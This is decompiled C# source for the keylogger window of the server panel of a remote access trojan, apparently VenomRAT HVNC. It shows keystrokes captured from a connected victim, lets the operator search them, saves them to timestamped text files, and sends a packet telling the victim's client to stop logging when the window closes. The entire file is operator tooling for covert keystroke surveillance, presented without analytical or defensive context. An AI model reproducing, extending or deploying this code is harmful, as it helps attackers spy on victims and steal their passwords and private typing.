using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000082 RID: 130
    public partial class FormKeylogger : Form
    {
        // Token: 0x060004BD RID: 1213 RVA: 0x00037BBF File Offset: 0x00037BBF
        public FormKeylogger()
        {
            this.InitializeComponent();
        }

        // Token: 0x170000CE RID: 206
        // (get) Token: 0x060004BE RID: 1214 RVA: 0x00037BD8 File Offset: 0x00037BD8
        // (set) Token: 0x060004BF RID: 1215 RVA: 0x00037BE0 File Offset: 0x00037BE0
        public Form1 F { get; set; }

        // Token: 0x170000CF RID: 207
        // (get) Token: 0x060004C0 RID: 1216 RVA: 0x00037BE9 File Offset: 0x00037BE9
        // (set) Token: 0x060004C1 RID: 1217 RVA: 0x00037BF1 File Offset: 0x00037BF1
        internal Clients Client { get; set; }

        // Token: 0x170000D0 RID: 208
        // (get) Token: 0x060004C2 RID: 1218 RVA: 0x00037BFA File Offset: 0x00037BFA
        // (set) Token: 0x060004C3 RID: 1219 RVA: 0x00037C02 File Offset: 0x00037C02
        public string FullPath { get; set; }

        // Token: 0x060004C4 RID: 1220 RVA: 0x00037C0C File Offset: 0x00037C0C
        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x060004C5 RID: 1221 RVA: 0x00037C4C File Offset: 0x00037C4C
        private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
        {
            StringBuilder sb = this.Sb;
            if (sb != null)
            {
                sb.Clear();
            }
            if (this.Client != null)
            {
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
                    msgPack.ForcePathObject("isON").AsString = "false";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                });
            }
        }

        // Token: 0x060004C6 RID: 1222 RVA: 0x00037C7C File Offset: 0x00037C7C
        private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            this.richTextBox1.SelectionStart = 0;
            this.richTextBox1.SelectAll();
            this.richTextBox1.SelectionBackColor = Color.White;
            if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
            {
                int num;
                for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
                {
                    num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
                    if (num == -1)
                    {
                        break;
                    }
                    this.richTextBox1.SelectionStart = num;
                    this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
                    this.richTextBox1.SelectionBackColor = Color.Yellow;
                }
            }
        }

        // Token: 0x060004C7 RID: 1223 RVA: 0x00037D4C File Offset: 0x00037D4C
        private void ToolStripButton1_Click(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
            }
            catch
            {
            }
        }

        // Token: 0x0400043F RID: 1087
        public StringBuilder Sb = new StringBuilder();
    }
}